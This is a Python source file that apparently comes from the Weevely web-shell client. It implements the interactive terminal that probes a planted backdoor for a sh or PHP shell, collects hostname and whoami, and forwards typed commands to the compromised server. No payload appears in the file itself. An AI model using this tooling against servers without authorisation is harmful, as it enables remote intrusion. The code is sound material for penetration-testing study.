from core.weexceptions import FatalException
from core.loggers import log, dlog
from core import messages
from core import modules
from core import config
from core.module import Status
from core import utilities
from mako import template
import readline
import cmd
import glob
import os
import shlex
import atexit
import sys

class CmdModules(cmd.Cmd):

    identchars = cmd.Cmd.identchars + ':'
    doc_header = "Modules and commands (type :help <module>):"
    nohelp = "[!] No help on %s"

    def complete(self, text, state):
        """Return the next possible completion for 'text'.

        If a command has not been entered, then complete against command list.
        Otherwise try to call complete_<command> to get list of completions.
        """
        if state == 0:
            import readline
            origline = readline.get_line_buffer()

            # Offer completion just for commands that starts
            # with the trigger :
            if origline and not origline.startswith(':'):
                return None

            line = origline.lstrip().lstrip(':')

            stripped = len(origline) - len(line)
            begidx = readline.get_begidx() - stripped
            endidx = readline.get_endidx() - stripped
            if begidx>0:
                cmd, args, foo = self.parseline(line)
                if cmd == '':
                    compfunc = self.completedefault
                else:
                    try:
                        compfunc = getattr(self, 'complete_' + cmd)
                    except AttributeError:
                        compfunc = self.completedefault
            else:
                compfunc = self.completenames
            self.completion_matches = compfunc(text, line, begidx, endidx)
        try:
            return self.completion_matches[state]
        except IndexError:
            return None

    def onecmd(self, line):
        """Interpret the argument as though it had been typed in response
        to the prompt.

        This may be overridden, but should not normally need to be;
        see the precmd() and postcmd() methods for useful execution hooks.
        The return value is a flag indicating whether interpretation of
        commands by the interpreter should stop.

        """
        cmd, arg, line = self.parseline(line)
        if not line:
            return self.emptyline()
        if cmd is None:
            return self.default(line)
        self.lastcmd = line
        if line == 'EOF' :
            #self.lastcmd = ''
            raise EOFError()
        if cmd == '':
            return self.default(line)
        if cmd:
            try:
                func = getattr(self, 'do_' + cmd.lstrip(':'))
            except AttributeError:
                return self.default(line)

            return func(arg, cmd)

        else:
            return self.default(line)


    def do_help(self, arg, command):
        """Fixed help."""

        print

        data = []
        for module_group, names in modules.loaded_tree.items():
            for module_name in names:
                data.append([ ':%s' % module_name, modules.loaded[module_name].info.get('description', '') ])

        if data: log.info(utilities.stringify(data, table_border = False))

        if self.session['shell_sh']['status'] == Status.RUN: print; return

        log.info(messages.terminal.help_no_shell)

        data = []
        for module_name, module in modules.loaded.items():
            if module.aliases:
                data.append([ ', '.join(module.aliases), module_name ])

        if data: log.info(utilities.stringify(data, table_border = False))

        print


class Terminal(CmdModules):

    """Weevely Terminal"""

    def __init__(self, session):

        cmd.Cmd.__init__(self)

        self.session = session
        self.prompt = 'weevely> '

        # Load all available modules
        self._load_modules()

        # Load history file
        self._load_history()

        # Set a nice intro
        self.intro = template.Template(
            messages.terminal.welcome_to_s
        ).render(
            path = self.session.get('path'),
            conn_info = session.get_connection_info(),
            version = messages.version
        )

        # Set default encoding utf8
        reload(sys)
        sys.setdefaultencoding('utf8')

    def emptyline(self):
        """Disable repetition of last command."""

        pass

    def precmd(self, line):
        """Before to execute a line commands. Confirm shell availability and get basic system infos """

        dlog.info('>>>> %s' % line)

        # Skip slack check is not a remote command
        if not line or any(
                        line.startswith(cmnd) for cmnd in (':set', ':help')
                    ):
            return line

        # If no default shell is available
        if not self.session.get('default_shell'):

            # Trigger the shell_sh/shell_php probe if
            # 1. We never tied to raise shells (shell_sh = IDLE)
            # 2. The basic intepreter shell_php failed. It's OK to retry.
            if (
                self.session['shell_sh']['status'] == Status.IDLE or
                self.session['shell_php']['status'] == Status.FAIL
                ):
                # force shell_php to idle to avoid to be skipped by shell_sh
                self.session['shell_php']['status'] = Status.IDLE
                self.session['shell_sh']['status'] = modules.loaded['shell_sh'].setup()

            for shell in ('shell_sh', 'shell_php'):
                if self.session[shell]['status'] == Status.RUN:
                    self.session['default_shell'] = shell
                    break

            # Re-check if some shell is loaded
            if not self.session.get('default_shell'):
                log.error(messages.terminal.backdoor_unavailable)
                return ''

            # Get hostname and whoami if not set
            if not self.session['system_info']['results'].get('hostname'):
                modules.loaded['system_info'].run_argv([ "-info", "hostname"])

            if not self.session['system_info']['results'].get('whoami'):
                modules.loaded['system_info'].run_argv(["-info", "whoami"])

        # Get current working directory if not set
        # Should be OK to repeat this every time if not set.
        if not self.session['file_cd']['results'].get('cwd'):
            self.do_file_cd(".")

        return line

    def postcmd(self, stop, line):

        default_shell = self.session.get('default_shell')

        if not default_shell:
            self.prompt = 'weevely> '
        else:
            if default_shell == 'shell_sh':
                prompt = '$'
            elif default_shell == 'shell_php':
                prompt = 'PHP>'
            else:
                prompt = '?'

            # Build next prompt, last command could have changed the cwd
            self.prompt = '%s %s ' % (self.session.get_connection_info(), prompt)


    def default(self, line):
        """Default command line send."""

        if not line: return

        default_shell = self.session.get('default_shell')

        if not default_shell: return

        result = modules.loaded[default_shell].run_argv([line])

        if not result: return

        log.info(result)

    def do_set(self, line, cmd):
        """Command "set" to set session variables."""

        try:
            args = shlex.split(line)
        except Exception as e:
            import traceback; log.debug(traceback.format_exc())
            log.warn(messages.generic.error_parsing_command_s % str(e))
            return

        # Print all settings that startswith args[0]
        if len(args) < 2:
            self.session.print_to_user(args[0] if args else '')

        # Set the setting
        else:
            if len(args) > 2:
                args[1] = ' '.join(args[1:])

            self.session.set(args[0], args[1])

    def _load_modules(self):
        """Load all modules assigning corresponding do_* functions."""

        for module_name, module_class in modules.loaded.items():

            # Set module.do_terminal_module() function as terminal
            # self.do_modulegroup_modulename()
            setattr(
                Terminal, 'do_%s' %
                (module_name), module_class.run_cmdline)

            # Set module.do_alias() function as terminal
            # self.do_alias() for every defined `Module.aliases`.
            for alias in module_class.aliases:
                setattr(
                    Terminal, 'do_%s' %
                    (alias), module_class.run_alias)
                setattr(
                    Terminal, 'help_%s' %
                    (alias), module_class.help)

            # Set module.help() function as terminal
            # self.help_modulegroup_modulename()
            setattr(
                Terminal, 'help_%s' %
                (module_name), module_class.help)

    def _load_history(self):
        """Load history file and register dump on exit."""

        # Create a file without truncating it in case it exists.
        open(config.history_path, 'a').close()

        readline.set_history_length(100)
        readline.read_history_file(config.history_path)
        atexit.register(readline.write_history_file,
            config.history_path)
